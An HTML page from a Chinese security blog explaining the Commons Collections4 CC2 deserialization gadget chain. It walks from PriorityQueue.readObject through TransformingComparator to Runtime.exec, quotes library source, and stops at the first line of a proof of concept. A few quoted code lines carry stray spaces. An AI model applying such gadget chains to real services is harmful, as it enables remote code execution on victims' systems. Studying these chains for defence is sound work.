@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 CC2链 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 CC2链">
+  <meta property="og:description" content="前言 Apache Commons Collections是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。
+在2015年cc链被提出时，Apache Commons Collections有两个分支：
+commons-collections:commons-collections（当时版本3.2.1） org.apache.commons:commons-collections4（当时版本4.0） 官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版 本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中。 那么很自然有个问题，既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢？
+commons-collections4的改动 为了探索这个问题，我们需要先搞清楚⼀点，⽼的利⽤链在commons-collections4中是否仍然能使⽤？
+首先引入commons-collections4
+&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; copy一份CC6的poc，然后将org.apache.commons.collections都改成org.apache.commons.collections4 看看还能执行吗
+发现只有一个报错
+Map outerMap = LazyMap.decorate(innerMap, transformerChain); 这里的decorate方法没了
+我们看一下原来decorate()方法的逻辑：
+public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } 就是调用LazyMap的构造方法而已
+我们在Commons-Collections4中发现了lazyMap()方法可以用来代替
+public static &lt;K, V&gt; LazyMap&lt;K, V&gt; lazyMap(Map&lt;K, V&gt; map, Factory&lt;? extends V&gt; factory) { return new LazyMap(map, factory); } 替换一下就好了
+成功弹出计算器，说明可以在Commons-Collections4中执行cc1、cc6等链子
+CommonsCollections2 除了前面学习的几条利用链，ysoserial还提出了2条新的链子：">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:44+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:44+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 CC2链">
+  <meta name="twitter:description" content="前言 Apache Commons Collections是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。
+在2015年cc链被提出时，Apache Commons Collections有两个分支：
+commons-collections:commons-collections（当时版本3.2.1） org.apache.commons:commons-collections4（当时版本4.0） 官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版 本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中。 那么很自然有个问题，既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢？
+commons-collections4的改动 为了探索这个问题，我们需要先搞清楚⼀点，⽼的利⽤链在commons-collections4中是否仍然能使⽤？
+首先引入commons-collections4
+&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; copy一份CC6的poc，然后将org.apache.commons.collections都改成org.apache.commons.collections4 看看还能执行吗
+发现只有一个报错
+Map outerMap = LazyMap.decorate(innerMap, transformerChain); 这里的decorate方法没了
+我们看一下原来decorate()方法的逻辑：
+public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } 就是调用LazyMap的构造方法而已
+我们在Commons-Collections4中发现了lazyMap()方法可以用来代替
+public static &lt;K, V&gt; LazyMap&lt;K, V&gt; lazyMap(Map&lt;K, V&gt; map, Factory&lt;? extends V&gt; factory) { return new LazyMap(map, factory); } 替换一下就好了
+成功弹出计算器，说明可以在Commons-Collections4中执行cc1、cc6等链子
+CommonsCollections2 除了前面学习的几条利用链，ysoserial还提出了2条新的链子：">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 CC2链",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE\/"
+        },"genre": "posts","keywords": "java","wordcount":  821 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE\/","datePublished": "2024-08-20T22:54:44+08:00","dateModified": "2024-08-20T22:54:44+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 CC2链</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;821 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#commons-collections4的改动">commons-collections4的改动</a></li>
+    <li><a href="#commonscollections2">CommonsCollections2</a>
+      <ul>
+        <li><a href="#priorityqueue">PriorityQueue</a></li>
+        <li><a href="#transformingcomparator">TransformingComparator</a></li>
+        <li><a href="#poc编写">poc编写</a></li>
+      </ul>
+    </li>
+    <li><a href="#cc2与templatesimpl">CC2与TemplatesImpl</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p><code>Apache Commons Collections</code>是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
+<p>在2015年cc链被提出时，<code>Apache Commons Collections</code>有两个分支：</p>
+<ul>
+<li>commons-collections:commons-collections（当时版本3.2.1）</li>
+<li>org.apache.commons:commons-collections4（当时版本4.0）</li>
+</ul>
+<p>官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版 本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中。
+那么很自然有个问题，既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢？</p>
+<h2 id="commons-collections4的改动">commons-collections4的改动</h2>
+<p>为了探索这个问题，我们需要先搞清楚⼀点，⽼的利⽤链在commons-collections4中是否仍然能使⽤？</p>
+<p>首先引入commons-collections4</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.commons<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;artifactId&gt;</span>commons-collections4<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;version&gt;</span>4.0<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>copy一份CC6的poc，然后将<code>org.apache.commons.collections</code>都改成<code>org.apache.commons.collections4 </code>看看还能执行吗</p>
+<p>发现只有一个报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map outerMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformerChain);
+</span></span></code></pre></div><p>这里的<code>decorate</code>方法没了</p>
+<p>我们看一下原来<code>decorate()</code>方法的逻辑：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">decorate</span>(Map map, Transformer factory) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> LazyMap(map, factory);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>就是调用<code>LazyMap</code>的构造方法而已</p>
+<p>我们在<code>Commons-Collections4</code>中发现了<code>lazyMap()</code>方法可以用来代替</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#f92672">&lt;</span>K, V<span style="color:#f92672">&gt;</span> LazyMap<span style="color:#f92672">&lt;</span>K, V<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">lazyMap</span>(Map<span style="color:#f92672">&lt;</span>K, V<span style="color:#f92672">&gt;</span> map, Factory<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">extends</span> V<span style="color:#f92672">&gt;</span> factory) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> LazyMap(map, factory);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>替换一下就好了</p>
+<!-- raw HTML omitted -->
+<p>成功弹出计算器，说明可以在<code>Commons-Collections4</code>中执行cc1、cc6等链子</p>
+<h2 id="commonscollections2">CommonsCollections2</h2>
+<p>除了前面学习的几条利用链，ysoserial还提出了2条新的链子：</p>
+<ul>
+<li>CommonsCollections2</li>
+<li>CommonsCollections4</li>
+</ul>
+<p>我们这里学习一下<code>CommonsCollections2</code></p>
+<p>我们看ysoserial的CC2的gadget，可以发现这里用到了一个<code>PriorityQueue</code>和<code>TransformingComparator</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   Gadget chain:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ObjectInputStream.readObject()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         PriorityQueue.readObject()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">               TransformingComparator.compare()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                  InvokerTransformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     Method.invoke()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        Runtime.exec()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span></code></pre></div><h3 id="priorityqueue">PriorityQueue</h3>
+<p>这个类中存在<code>readObject()</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">IOException</span>, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in size, and any hidden stuff</span>
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in (and discard) array length</span>
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">readInt</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        SharedSecrets.<span style="color:#a6e22e">getJavaOISAccess</span>().<span style="color:#a6e22e">checkArray</span>(s, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, size);
+</span></span><span style="display:flex;"><span>        queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>size<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in all elements.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>            queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Elements are guaranteed to be in &#34;proper order&#34;, but the</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// spec has never explained what that might be.</span>
+</span></span><span style="display:flex;"><span>        heapify();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>反序列化时会调用<code>heapify()</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">heapify</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> (size <span style="color:#f92672">&gt;&gt;&gt;</span> 1) <span style="color:#f92672">-</span> 1; i <span style="color:#f92672">&gt;=</span> 0; i<span style="color:#f92672">--</span>)
+</span></span><span style="display:flex;"><span>            siftDown(i, (E) queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDown</span>(<span style="color:#66d9ef">int</span> k, E x) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (comparator <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>            siftDownUsingComparator(k, x);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            siftDownComparable(k, x);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDownUsingComparator</span>(<span style="color:#66d9ef">int</span> k, E x) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> half <span style="color:#f92672">=</span> size <span style="color:#f92672">&gt;&gt;&gt;</span> 1;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (k <span style="color:#f92672">&lt;</span> half) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> child <span style="color:#f92672">=</span> (k <span style="color:#f92672">&lt;&lt;</span> 1) <span style="color:#f92672">+</span> 1;
+</span></span><span style="display:flex;"><span>            Object c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> right <span style="color:#f92672">=</span> child <span style="color:#f92672">+</span> 1;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (right <span style="color:#f92672">&lt;</span> size <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>                comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>) <span style="color:#f92672">&gt;</span> 0)
+</span></span><span style="display:flex;"><span>                c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child <span style="color:#f92672">=</span> right<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (comparator.<span style="color:#a6e22e">compare</span>(x, (E) c) <span style="color:#f92672">&lt;=</span> 0)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> c;
+</span></span><span style="display:flex;"><span>            k <span style="color:#f92672">=</span> child;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> x;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>heapify()</code>方法会调用<code>siftDown()</code>方法，继而调用<code>siftDownUsingComparator()</code>，然后调用<code>comparator.compare()</code>方法，这个<code>comparator</code>变量是可控的，我们看一下<code>PriorityQueue</code>的构造方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">PriorityQueue</span>(<span style="color:#66d9ef">int</span> initialCapacity,
+</span></span><span style="display:flex;"><span>                         Comparator<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">super</span> E<span style="color:#f92672">&gt;</span> comparator) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Note: This restriction of at least one is not actually needed,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// but continues for 1.5 compatibility</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (initialCapaci ty <span style="color:#f92672">&lt;</span> 1)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>initialCapacity<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span> <span style="color:#f92672">=</span> comparator;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>comparator</code>是一个<code>Comparator</code>类型的对象，我们可以找到一个<code>org.apache.commons.collections4.comparators.TransformingComparator</code>类</p>
+<h3 id="transformingcomparator">TransformingComparator</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TransformingComparator</span> <span style="color:#66d9ef">implements</span> Comparator {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> Comparator decorated;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> Transformer transformer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TransformingComparator</span>(Transformer transformer) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>(transformer, <span style="color:#66d9ef">new</span> ComparableComparator());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TransformingComparator</span>(Transformer transformer, Comparator decorated) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decorated</span> <span style="color:#f92672">=</span> decorated;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span> <span style="color:#f92672">=</span> transformer;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(Object obj1, Object obj2) {
+</span></span><span style="display:flex;"><span>        Object value1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">tra</span> nsformer.<span style="color:#a6e22e">transform</span>(obj1);
+</span></span><span style="display:flex;"><span>        Object value2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span>.<span style="color:#a6e22e">transform</span>(obj2);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decorated</span>.<span style="color:#a6e22e">compare</span>(value1, value2);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这个<code>TransformingComparator</code>类的<code>compare()</code>方法可以调用<code>transform</code>方法</p>
+<p>于是我们就可以构造一条从<code>PriorityQueue</code>到<code>TransformingComparator</code>调用其<code>compare()</code>方法，再调用<code>transform()</code>方法导致反序列化的链子了</p>
+<blockquote>
+<p>java.util.PriorityQueue ，它在Java中是一个优先队列，队列中每一个</p>
+<p>元素有自己的优先级。在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作，而排序就涉</p>
+<p>及到大小比较，进而执行 java.util.Comparator 接口的 compare() 方法</p>
+</blockquote>
+<h3 id="poc编写">poc编写</h3>
+<p>首先创建<code>Transformer</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Transformer<span style="color:#f92672">[]</span> fakeTransformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {<span style="color:#66d9ef">new</span> ConstantTransformer(1)}; 
